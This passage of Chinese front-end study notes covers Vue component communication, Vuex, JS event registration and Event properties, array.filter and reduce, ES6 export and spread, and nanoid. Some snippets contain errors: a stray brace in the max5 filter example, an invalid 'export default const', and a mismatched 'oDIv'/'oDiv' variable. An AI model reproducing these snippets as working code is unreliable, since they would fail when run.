&lt;div&gt;</span><br><span class="line">        &lt;p&gt;this is parent compoent!&lt;/p&gt;</span><br><span class="line">        &lt;button @click=&quot;changeChildValue&quot;&gt;test&lt;/button &gt;</span><br><span class="line">        &lt;child&gt;&lt;/child&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      changeChildValue()&#123;</span><br><span class="line">        this.$children[0].mymessage = &#x27;hello&#x27;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    data()&#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        message:&#x27;hello&#x27;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  var app=new Vue(&#123;</span><br><span class="line">    el:&#x27;#app&#x27;,</span><br><span class="line">    template:`</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;parent&gt;&lt;/parent&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    `</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure><p><strong>7. vuex处理组件之间的数据交互</strong></p><p><img src="https://pic4.zhimg.com/80/v2-f4020daf369692252bcab614e2f4b9e7_720w.jpg" alt="img"></p><h3 id="1-简要介绍-Vuex-原理"><a href="#1-简要介绍-Vuex-原理" class="headerlink" title="1. 简要介绍 Vuex 原理"></a><strong>1. 简要介绍 Vuex 原理</strong></h3><p>Vuex 实现了一个单向数据流，在全局拥有一个 State 存放数据，当组件要更改 State 中的数据时，必须通过 Mutation  进行，Mutation 同时提供了订阅者模式供外部插件调用获取 State  数据的更新。而当所有异步操作(常见于调用后端接口异步获取更新数据)或批量的同步操作需要走 Action，但 Action 也是无法直接修改  State 的，还是需要通过 Mutation 来修改 State 的数据。最后，根据 State 的变化，渲染到视图上。</p><h3 id="2-简要介绍各模块在流程中的功能："><a href="#2-简要介绍各模块在流程中的功能：" class="headerlink" title="2. 简要介绍各模块在流程中的功能："></a><strong>2. 简要介绍各模块在流程中的功能：</strong></h3><ul><li>Vue Components：Vue 组件。HTML 页面上，负责接收用户操作等交互行为，执行 dispatch 方法触发对应 action 进行回应。</li><li>dispatch：操作行为触发方法，是唯一能执行 action 的方法。</li><li>actions：<strong>操作行为处理模块,由组件中的<code>$store.dispatch(&#39;action 名称&#39;, data1)</code>来触发。然后由 commit()来触发 mutation 的调用 , 间接更新 state</strong>。负责处理 Vue Components 接收到的所有交互行为。包含同步/异步操作，支持多个同名方法，按照注册的顺序依次触发。向后台 API  请求的操作就在这个模块中进行，包括触发其他 action 以及提交 mutation 的操作。该模块提供了 Promise 的封装，以支持  action 的链式触发。</li><li>commit：状态改变提交操作方法。对 mutation 进行提交，是唯一能执行 mutation 的方法。</li><li>mutations：<strong>状态改变操作方法，由 actions 中的<code>commit(&#39;mutation 名称&#39;)</code>来触发</strong>。是 Vuex 修改 state 的唯一推荐方法。该方法只能进行同步操作，且方法名只能全局唯一。操作之中会有一些 hook 暴露出来，以进行 state 的监控等。</li><li>state：页面状态管理容器对象。集中存储 Vue components 中 data 对象的零散数据，全局唯一，以进行统一的状态管理。页面显示所需的数据从该对象中进行读取，利用 Vue 的细粒度数据响应机制来进行高效的状态更新。</li><li>getters：state 对象读取方法。图中没有单独列出该模块，应该被包含在了 render 中，Vue Components 通过该方法读取全局 state 对象。</li></ul><h3 id="JS注册事件三种写法"><a href="#JS注册事件三种写法" class="headerlink" title="JS注册事件三种写法"></a>JS注册事件三种写法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 1.onclick注册事件</span><br><span class="line">// 缺点:不能为同一事件源注册多个事件</span><br><span class="line">var btn = document.getElementById(&#x27;btn&#x27;);</span><br><span class="line">btn.onclick = function()&#123;</span><br><span class="line">alert(&#x27;hello&#x27;);</span><br><span class="line">&#125;;</span><br><span class="line">btn.onclick = function()&#123;</span><br><span class="line">alert(&#x27;你好&#x27;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 2.addEventListener()监听器注册事件,可谓同一事件源注册多个事件</span><br><span class="line">// 缺点:IE9以前不兼容</span><br><span class="line">var btn = document.getElementById(&#x27;btn&#x27;);</span><br><span class="line">btn.addEventListener(&#x27;click&#x27;,function()&#123;</span><br><span class="line">alert(&#x27;hello&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line">btn.addEventListener(&#x27;click&#x27;,function()&#123;</span><br><span class="line">alert(&#x27;你好&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 3.attachEvent()监听器注册事件,可谓同一事件源注册多个事件</span><br><span class="line">// IE6-10版本可用</span><br><span class="line">var btn = document.getElementById(&#x27;btn&#x27;);</span><br><span class="line">btn.attachEvent(&#x27;onclick&#x27;,function()&#123;</span><br><span class="line">alert(&#x27;hello&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line">btn.attachEvent(&#x27;onclick&#x27;,function()&#123;</span><br><span class="line">alert(&#x27;你好&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="JS事件对象"><a href="#JS事件对象" class="headerlink" title="JS事件对象"></a>JS事件对象</h3><ul><li>什么时候会产生Event 对象呢? <ul><li>例如: 当用户单击某个元素的时候,我们给这个元素注册的事件就会触发,该事件的本质就是一个函数,而该函数的形参接收一个event对象.</li></ul></li><li>事件通常与函数结合使用，函数不会在事件发生前被执行！</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var oDIv = document.getElementById(&#x27;box&#x27;);</span><br><span class="line"></span><br><span class="line">oDiv.onclick = function(event)&#123;</span><br><span class="line">    .........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202182104489.png" alt="img"></p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202182106918.png" alt="img"></p><p><strong>event上常见的属性</strong></p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>altKey</td><td>返回当事件被触发时，”ALT” 是否被按下。</td></tr><tr><td>button</td><td>返回当事件被触发时，哪个鼠标按钮被点击。</td></tr><tr><td>clientX</td><td>返回当事件被触发时，鼠标指针的水平坐标。</td></tr><tr><td>clientY</td><td>返回当事件被触发时，鼠标指针的垂直坐标。</td></tr><tr><td>ctrlKey</td><td>返回当事件被触发时，”CTRL” 键是否被按下。</td></tr><tr><td>metaKey</td><td>返回当事件被触发时，”meta” 键是否被按下。</td></tr><tr><td>relatedTarget</td><td>返回与事件的目标节点相关的节点。</td></tr><tr><td>screenX</td><td>返回当某个事件被触发时，鼠标指针的水平坐标。</td></tr><tr><td>screenY</td><td>返回当某个事件被触发时，鼠标指针的垂直坐标。</td></tr><tr><td>shiftKey</td><td>返回当事件被触发时，”SHIFT” 键是否被按下。</td></tr></tbody></table><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td><code>cancelBubble</code></td><td>如果事件句柄想阻止事件传播到包容对象，必须把该属性设为 true。</td></tr><tr><td>fromElement</td><td>对于 mouseover 和 mouseout 事件，fromElement 引用移出鼠标的元素。</td></tr><tr><td>keyCode</td><td>对于 keypress 事件，该属性声明了被敲击的键生成的 Unicode 字符码。对于 keydown 和 keyup</td></tr><tr><td>offsetX,offsetY</td><td>发生事件的地点在事件源元素的坐标系统中的 x 坐标和 y 坐标。</td></tr><tr><td><code>returnValue</code></td><td>如果设置了该属性，它的值比事件句柄的返回值优先级高。把这个属性设置为</td></tr><tr><td><code>srcElement</code></td><td>对于生成事件的 Window 对象、Document 对象或 Element 对象的引用。</td></tr><tr><td>toElement</td><td>对于 mouseover 和 mouseout 事件，该属性引用移入鼠标的元素。</td></tr><tr><td>x,y</td><td>事件发生的位置的 x 坐标和 y 坐标，它们相对于用CSS动态定位的最内层包容元素。</td></tr></tbody></table><table><thead><tr><th><strong>属性和方法</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><strong>bubbles</strong></td><td><strong>返回布尔值，指示事件是否是起泡事件类型。</strong></td></tr><tr><td><strong><code>cancelable</code></strong></td><td><strong>返回布尔值，指示事件是否可拥可取消的默认动作。</strong></td></tr><tr><td><strong><code>currentTarget</code></strong></td><td><strong>返回其事件监听器触发该事件的元素。</strong></td></tr><tr><td><strong>eventPhase</strong></td><td><strong>返回事件传播的当前阶段。</strong></td></tr><tr><td><strong><code>target</code></strong></td><td><strong>返回触发此事件的元素（事件的目标节点）。</strong></td></tr><tr><td><strong>timeStamp</strong></td><td><strong>返回事件生成的日期和时间。</strong></td></tr><tr><td><strong><code>type</code></strong></td><td><strong>返回当前 Event 对象表示的事件的名称。</strong></td></tr><tr><td><strong>initEvent()</strong></td><td><strong>初始化新创建的 Event 对象的属性。</strong></td></tr><tr><td><strong><code>preventDefault()</code></strong></td><td><strong>通知浏览器不要执行与事件关联的默认动作。</strong></td></tr><tr><td><code>stopPropagation()</code></td><td>不再派发事件。</td></tr></tbody></table><h3 id="JS中的array-filter"><a href="#JS中的array-filter" class="headerlink" title="JS中的array.filter"></a>JS中的array.filter</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array.filter(<span class="function"><span class="keyword">function</span>(<span class="params">currentValue, indedx, arr</span>), <span class="title">thisValue</span>)</span></span><br></pre></td></tr></table></figure><p><em><strong>currentValue</strong>：</em>必须。当前元素的值;<br><em><strong>index</strong>：</em>可选。当前元素的索引值；<br><em><strong>arr</strong>：</em>可选。当前元素属于的数组对象；<br><em><strong>thisValue</strong>：</em>可选。对象作为该执行回调时使用，传递给函数，用作 “this” 的值。<br>如果省略了 thisValue ，”this” 的值为 “undefined”。</p><ul><li>filter用于对数组进行<strong>过滤</strong>。</li><li>它创建一个新数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。</li><li>注意：filter()不会对空数组进行检测、不会改变原始数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">3</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">9</span>];</span><br></pre></td></tr></table></figure><p><strong>1. 返回数组nums中所有大于5的元素。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">max5</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">     <span class="keyword">return</span> arr.filter(<span class="function">(<span class="params">x</span>) =&gt;</span> x &gt; <span class="number">5</span>&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ES6语法：箭头函数(参数1, 参数2 ...) =&gt; &#123; 函数体 &#125;</span></span><br><span class="line"><span class="comment">//如果有且仅有 1 个形参，则()可以省略</span></span><br><span class="line"><span class="comment">//如果函数体内有且仅有 1 条语句，则&#123;&#125;可以省略，但前提是，这条语句必须是 return 语句。</span></span><br></pre></td></tr></table></figure><p><strong>2. 移除数组 arr 中的所有值与 item 相等的元素。不要直接修改数组 arr，结果返回新的数组</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">arr, item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arr.filter(<span class="function"><span class="params">val</span> =&gt;</span> val != item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3. 数组去重</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = arr.filter(<span class="function"><span class="keyword">function</span> (<span class="params">element, index, self</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> self.indexOf(element) == index;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>去除重复元素依靠的是<code>indexOf</code>总是返回第一个元素的位置，后续的重复元素位置与<code>indexOf</code>返回的位置不相等，因此被<code>filter</code>滤掉了。</p><p><strong>4. 在数组 arr 中，查找值与 item 相等的元素出现的所有位置</strong></p><blockquote><p>输入<br>[‘a’,’b’,’c’,’d’,’e’,’f’,’a’,’b’,’c’] ‘a’<br>输出<br>[0, 6]</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">findAllOccurrences</span>(<span class="params">arr, target</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res=[];</span><br><span class="line">    arr.filter(<span class="function"><span class="keyword">function</span>(<span class="params">ele,index</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (ele===target)&amp;&amp;res.push(index);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ES6-export"><a href="#ES6-export" class="headerlink" title="ES6 export"></a>ES6 export</h3><p>相信很多人都使用过export、export default、import，然而它们到底有什么区别呢？</p><p>在JavaScript ES6中，export与export default均可用于导出常量、函数、文件、模块等，你可以在其它文件或模块中通过import+(常量 | 函数 | 文件 | 模块)名的方式，将其导入，以便能够对其进行使用，但在一个文件或模块中，export、import可以有多个，export default仅有一个。<br>具体使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo1.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> str = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的导入方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo2.js</span></span><br><span class="line"><span class="keyword">import</span> &#123; str, f &#125; <span class="keyword">from</span> <span class="string">&#x27;demo1&#x27;</span> <span class="comment">//也可以分开写两次，导入的时候带花括号</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo1.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">const</span> str = <span class="string">&#x27;hello world&#x27;</span></span><br></pre></td></tr></table></figure><p>对应的导入方式：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo2.js</span></span><br><span class="line"><span class="keyword">import</span> str <span class="keyword">from</span> <span class="string">&#x27;demo1&#x27;</span> <span class="comment">//导入的时候没有花括号</span></span><br></pre></td></tr></table></figure><h3 id="Es6…"><a href="#Es6…" class="headerlink" title="Es6…"></a>Es6…</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//es5</span></span><br><span class="line"><span class="keyword">let</span> book1 = [<span class="string">&#x27;平凡的世界第一部&#x27;</span>, <span class="string">&#x27;平凡的世界第二部&#x27;</span>, <span class="string">&#x27;平凡的世界第三部&#x27;</span>]</span><br><span class="line"><span class="keyword">let</span> book2 = [<span class="string">&#x27;人生&#x27;</span>]</span><br><span class="line"><span class="keyword">let</span> book3 = book1.concat(book2);</span><br><span class="line"><span class="comment">//console.log(book3) // (4) [&quot;平凡的世界第一部&quot;, &quot;平凡的世界第二部&quot;, &quot;平凡的世界第三部&quot;, &quot;人生&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//es6</span></span><br><span class="line"><span class="keyword">let</span> book4 = [...book1, ...book2];</span><br><span class="line">book4[<span class="number">3</span>] = <span class="string">&#x27;月夜静悄悄&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(book4) <span class="comment">//(4) [&quot;平凡的世界第一部&quot;, &quot;平凡的世界第二部&quot;, &quot;平凡的世界第三部&quot;, &quot;月夜静悄悄&quot;]</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1 = &#123;</span><br><span class="line">    <span class="attr">book1</span>: <span class="string">&#x27;平凡的世界第一部&#x27;</span>,</span><br><span class="line">    <span class="attr">book2</span>: <span class="string">&#x27;平凡的世界第二部&#x27;</span>,</span><br><span class="line">    <span class="attr">book3</span>:<span class="string">&#x27;平凡的世界第三部&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;</span><br><span class="line">    ...obj1,</span><br><span class="line">    <span class="attr">book4</span>:<span class="string">&#x27;人生&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj2) <span class="comment">//&#123;book1: &quot;平凡的世界第一部&quot;, book2: &quot;平凡的世界第二部&quot;, book3: &quot;平凡的世界第三部&quot;, book4: &quot;人生&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如后者与前者相同，后者覆盖前者</span></span><br><span class="line"><span class="keyword">let</span> obj1 = &#123;</span><br><span class="line">    <span class="attr">book1</span>: <span class="string">&#x27;平凡的世界第一部&#x27;</span>,</span><br><span class="line">    <span class="attr">book2</span>: <span class="string">&#x27;平凡的世界第二部&#x27;</span>,</span><br><span class="line">    <span class="attr">book3</span>: <span class="string">&#x27;平凡的世界第三部&#x27;</span>,</span><br><span class="line">    <span class="attr">book4</span>: <span class="string">&#x27;月夜静悄悄&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;</span><br><span class="line">    ...obj1,</span><br><span class="line">    <span class="attr">book4</span>: <span class="string">&#x27;月夜静悄悄11111&#x27;</span>,</span><br><span class="line">    <span class="attr">book5</span>: <span class="string">&#x27;人生&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj2) <span class="comment">//&#123;book1: &quot;平凡的世界第一部&quot;, book2: &quot;平凡的世界第二部&quot;, book3: &quot;平凡的世界第三部&quot;, book4: &quot;月夜静悄悄11111&quot;, book5: &quot;人生&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">name</span>: <span class="string">&#x27;daisy&#x27;</span>, &#125;</span><br><span class="line"><span class="keyword">let</span> obj1 = &#123; <span class="attr">job</span>: <span class="string">&#x27;web&#x27;</span>, &#125;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123; <span class="attr">sex</span>: <span class="number">1</span>, &#125;</span><br><span class="line"><span class="keyword">let</span> obj5 = &#123; ...obj, ...obj1, ...obj2 &#125;</span><br><span class="line"><span class="built_in">console</span>.log(obj5) <span class="comment">//&#123;name: &quot;daisy&quot;, job: &quot;web&quot;, sex: 1&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//与Object.assign用法相同 Object.assign(target, ...sources)</span></span><br><span class="line"><span class="keyword">let</span> obj4 = <span class="built_in">Object</span>.assign(obj, obj1, obj2);</span><br><span class="line"><span class="built_in">console</span>.log(obj4) <span class="comment">//&#123;name: &quot;daisy&quot;, job: &quot;web&quot;, sex: 1&#125;</span></span><br><span class="line"><span class="built_in">console</span>.log(obj) <span class="comment">//&#123;name: &quot;daisy&quot;, job: &quot;web&quot;, sex: 1&#125;  /**注意目标对象也会随之改变 */</span></span><br></pre></td></tr></table></figure><h3 id="nanoid"><a href="#nanoid" class="headerlink" title="nanoid"></a>nanoid</h3><p>nanoid库和uuid库一样都可以生成uuid，但是nanoid相比uuid要更轻量级，下面就来演示一下如何在项目中使用nanoid。<br>1.在项目目录下打开终端，下载安装nanoid库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i nanoid</span><br></pre></td></tr></table></figure><p>或者，如果你安装了yarn可以使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add nanoid</span><br></pre></td></tr></table></figure><p>2.引入nanoid库</p><p>nanoid库中用分别暴露的方式暴露了一个函数nanoid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import &#123;nanoid&#125; from &#x27;nanoid&#x27;</span><br></pre></td></tr></table></figure><p>3.使用nanoid生成uuid</p><p>直接调用nanoid()，即可生成一个uuid</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span></span><br><span class="line"><span class="keyword">import</span> &#123;nanoid&#125; <span class="keyword">from</span> <span class="string">&#x27;nanoid&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./index.css&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Header</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">handleKeyUp = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;keyCode, target&#125; = event;</span><br><span class="line">    <span class="comment">// 判断是否是回车</span></span><br><span class="line">    <span class="keyword">if</span> (keyCode !== <span class="number">13</span>) <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> (target.value.trim() === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        alert(<span class="string">&quot;输入不能为空&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> todoObj = &#123;<span class="attr">id</span>:nanoid(),<span class="attr">name</span>:target.value,<span class="attr">done</span>:<span class="literal">false</span>&#125;</span><br><span class="line">    <span class="built_in">this</span>.props.addTodo(todoObj)</span><br><span class="line">    target.value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">render</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;todo-header&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">onKeyUp</span>=<span class="string">&#123;this.handleKeyUp&#125;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入你的任务名称，按回车键确认&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>组件化编码流程：</p><p>​    (1).拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。</p><p>​    (2).实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：</p><p>​            1).一个组件在用：放在组件自身即可。</p><p>​            2). 一些组件在用：放在他们共同的父组件上（<span style="color:red">状态提升</span>）。</p><p>​    (3).实现交互：从绑定事件开始。</p></li><li><p>props适用于：</p><p>​    (1).父组件 ==&gt; 子组件 通信</p><p>​    (2).子组件 ==&gt; 父组件 通信（要求父先给子一个函数）</p></li><li><p>使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</p></li><li><p>props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。</p></li></ol><h3 id="JS-array-reduce"><a href="#JS-array-reduce" class="headerlink" title="JS array.reduce"></a>JS array.reduce</h3><p>reduce() 方法接收一个函数作为累加器(accumulator)，数组中的每个值(从左到右)开始缩减，最终为一个值。<br>reduce() 为数组中的每一个元素依次执行回调函数，不包括数组中被删除或从未被赋值的元素，接受四个参数：初始值(或者上次回调函数的返回值)，当前元素值，当前索引，调用reduce的数组。<br><strong>语法</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arr.reduce(callback, [initialValue])</span><br></pre></td></tr></table></figure><p>callback (执行数组中每个值的函数，包含四个参数)</p><ul><li>previousValue (上一次调用回调返回的值，或者是提供的初始值(initialValue))</li><li>currentValue (数组中当前被处理的元素)</li><li>index (当前元素在数组中的索引)</li><li>array (调用 reduce 的数组)<br>initialValue (作为第一次调用 callback 的第一个参数)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">pre, cur, index, arr</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(pre, cur, index);</span><br><span class="line">    <span class="keyword">return</span> pre + cur;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(arr, sum);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*也可以写成*/</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function">(<span class="params">pre, cur, index, arr</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(pre, cur, index);</span><br><span class="line">    <span class="keyword">return</span> pre + cur;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(arr, sum);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>例一打印结果：</strong><br> 1 2 1<br> 3 3 2<br> 6 4 3<br> [1, 2, 3, 4] 